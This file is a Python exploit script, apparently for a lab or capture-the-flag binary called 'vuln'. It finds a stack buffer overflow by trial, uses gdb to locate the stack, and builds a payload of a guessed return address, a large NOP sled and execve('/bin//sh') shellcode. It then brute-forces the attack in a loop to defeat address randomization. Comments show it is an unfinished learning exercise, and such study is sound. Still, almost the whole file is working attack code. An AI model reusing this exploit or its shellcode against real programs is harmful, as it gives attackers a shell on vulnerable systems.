import subprocess
import struct
import os
import re
import sys
import pty
import select



#this program has PIE enabled -> compilation option that changes the location of the executable in every run. PIE does not work locally

#first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
# python3 -c "import sys; trash=b'B'\*131000; sys.stdout.buffer.write(trash)" > trash
trash = b'B'*131000
open("trash", "wb").write(trash)

#then call gdb to find in what adresses the stack fluctuates -> info proc mapping
gdb_process = subprocess.Popen(['gdb', 'vuln'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
commands = """
set disable-randomization off
b vuln
r `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`
info proc mapping
q
y
"""
output, errors = gdb_process.communicate(commands)

# Find the line containing the word "stack" and extract the address in the middle
output_lines = output.split('\n')
stack_line = next((line for line in output_lines if 'stack' in line), None)
# print(stack_line)
if(stack_line == None):
    print("gdb failed.")
    sys.exit(1)
pattern = r'\b0x[0-9a-f]+\b|\[stack\]'
matches = re.findall(pattern, stack_line)
start_address = int(matches[0], 16)
end_address = int(matches[1], 16)
middle = (start_address + end_address) // 2
middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

#find where the buffer overflows
overflow = b'A'
while True:
    vuln_proc = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    vuln_output, _ = vuln_proc.communicate(overflow)

    if vuln_proc.returncode == -11:
        # print(f"Segmentation fault occurred with buffer length: {len(overflow)}")
        #not sure why the program crashes at 136 bytes length, will add 4 bytes to the buffer to cover ebp and reach the return address location. Must change!
        overflow += b'A'*4

        #constructing the payload
        # python3 -c "import sys; payload=b'B'*140; payload+=b'\x04\x80\xb5\xff'; payload+=b'\x90'*100000; payload += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'; sys.stdout.buffer.write(payload)" > vuln_payload
        payload = overflow
        payload += struct.pack("<I", middle)
        payload += b'\x90' * 200000
        payload += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

        open("vuln_payload", "wb").write(payload)

        #performing brute force attack
        #while true; do cat vuln_payload - | ./vuln `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`; done
        exploit_command = "cat vuln_payload - | ./vuln `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`"
        i = 0
        while True:
            print(i)
            i += 1

            master_fd, slave_fd = pty.openpty()

            exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=slave_fd, stdin=slave_fd, stdout=slave_fd, close_fds=True)
            print(f"Subprocess PID: {exploit_proc.pid}")

            #check if vuln is blocked while expecting input (select -> non blocking)
            # _, wlist, _ = select.select([], [master_fd], [])

            # if master_fd in wlist:       #must know the form of input. Is it arguments? Or stdin? Or socket? ect
            #     print("sending the payload")
            os.write(master_fd, b'\n')

            while True:
                    rlist, _, _ = select.select([master_fd, 0], [], [])
                    status = exploit_proc.poll()        #why is the status still None after segmentation fault??
                    # print(f"process status: {status}")


                    # Check if there is output from the process (master_fd)
                    if master_fd in rlist:
                        try:
                            output = os.read(master_fd, 100000)
                            if output:
                                # os.write(1, output)  # Write the process output to stdout (1)
                                if b'Segmentation fault' in output:
                                    exploit_proc.terminate()
                                    break

                            else:
                                break  # Process has exited
                        except OSError:
                            break  # Handle OS errors

                    # Check if there is user input (0 represents stdin)
                    # if 0 in rlist:
                    #     print("2")

                    #     try:
                    #         user_input = os.read(0, 1024)
                    #         if user_input:
                    #             os.write(master_fd, user_input)  # Forward user input to the process
                    #         else:
                    #             break  # EOF from user input
                    #     except OSError:
                    #         break  # Handle OS errors

                # Close the PTY file descriptors

            
            os.close(master_fd)
            os.close(slave_fd)


            # while True:
            #     status = exploit_proc.poll()
            #     if status is None:
            #         print("Subprocess is still running.")

            #         _, wlist1, _ = select.select([], [master_fd], [])
            #         if master_fd in wlist1:
            #             print("exploit has probably succeeded??")

            #             rlist, _, _ = select.select([master_fd, 0], [], [])

            #             if master_fd in rlist:
            #                 print("here1")
            #                 try:
            #                     output = os.read(master_fd, 1024)
            #                     if output:
            #                         os.write(1, output) 
            #                     else:
            #                         break 
            #                 except OSError:
            #                     print("e1")
            #                     break     

            #             if 0 in rlist:
            #                 print("here2")

            #                 try:
            #                     user_input = os.read(0, 1024)
            #                     if user_input:
            #                         os.write(master_fd, user_input)  
            #                     else:
            #                         break
            #                 except OSError:
            #                     print("e2")
            #                     break
            #         else:
            #             print("??")
            #             continue
            #         break
            #     else:
            #         print(f"Subprocess has finished with exit code {status}.")
            #     break

            


            # if(exploit_proc.returncode != 139):
            #     # print(f"exploit proc return code: {exploit_proc.returncode}")
            #     break

        
        break
    else:
        overflow += b'A'

os.remove("trash")
os.remove("vuln_payload")

